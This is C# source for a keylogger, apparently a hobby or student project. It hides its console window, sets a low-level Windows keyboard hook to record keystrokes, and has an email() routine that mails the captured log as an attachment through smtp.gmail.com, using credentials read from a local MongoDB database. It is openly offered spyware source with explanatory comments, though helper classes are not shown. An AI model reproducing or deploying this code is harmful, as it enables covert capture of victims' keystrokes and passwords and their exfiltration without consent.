using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices; // Meeded to import needed .dll files to allow recording keystrokes.
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.Mail;
using MongoDB.Driver;
using MongoDB.Bson;
using MongoDB.Bson.Serialization.Attributes;
using MongoDB.Driver.Core;
namespace Keylogger
{
    class Program
    {
        public static string emailde; // variable for email
        public static string passwordde; // variable for password
        public static void email() // method for sending email of keylogged data
        {
            MailMessage mail = new MailMessage(); // allows email commmands from MailMessage Class
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com", 587); // setting up SmtpServer, which is the standard protocol for sending emails and connects it to the gmail server since I'm using gmail
            mail.From = new MailAddress(emailde); // Email being used to send
            mail.To.Add(emailde); // the recepiant of the email
            mail.Subject = "KEYLOGGED DATA!"; // Email Subject title
            mail.Attachments.Add(new Attachment(Application.StartupPath + @".txt")); // adds attached file; which is the keylogged data
            SmtpServer.UseDefaultCredentials = false; // nullifies credentials for email sending
            SmtpServer.Credentials = new NetworkCredential(emailde, passwordde); // sets the email credentials to users input
            SmtpServer.EnableSsl = true; // enables ssl to encrypt connection 
            SmtpServer.Send(mail); // sends the email
        }
        public static keylogvariables.LowLevelKeyboardProc llkProcedure = keylogvariables.Hookcallback;
        static void keylogger(keylogvariables log)
        {
            const int SW_HIDE = 0; // constant needed to determine whether to show the console window or hide; in this case 0 is equal to hide
            var llparam = llkProcedure; // decalres llparam as the llkprocedure to allow hook
            var handle = keylogvariables.GetConsoleWindow(); // variable to initalise the GetConsoleWindow command from kernel32.dll
            keylogvariables.ShowWindow(handle, SW_HIDE); // initalises the hiding of the console window using the handle and the constant
            keylogvariables.hook = keylogvariables.Sethook(llparam); //sets the hook 
            Application.Run();
            // keylogvariables.UnhookWindowsHookEx(keylogvariables.hook); // a command just in case we need to stop the hook and stop keylogging 
        }
        static async Task CallMain(string[] args)
        {
            keylogvariables log = new keylogvariables();
            var conString = "mongodb://localhost:27017";
            var client = new MongoClient(conString);
            var data = client.GetDatabase("Emails&Passwords");
            var coll = data.GetCollection<BsonDocument>("Email & Passwords");
            using (var cursor = await coll.Find(new BsonDocument()).ToCursorAsync())
            {
                while(await cursor.MoveNextAsync())
                {
                    foreach(var objects in cursor.Current)
                    {
                        emailde = (string)objects["email"];
                        passwordde = (string)objects["password"];
                    }
                }
            }
            keylogger(log);
        }
        static void Main(string[] args)
        {
            CallMain(args).Wait();
        }
    }
    public class emailandpassword
    {
        [BsonId]
        public Guid Id { get; set; }
        public string email { get; set; }
        public string password { get; set; }
    }
}
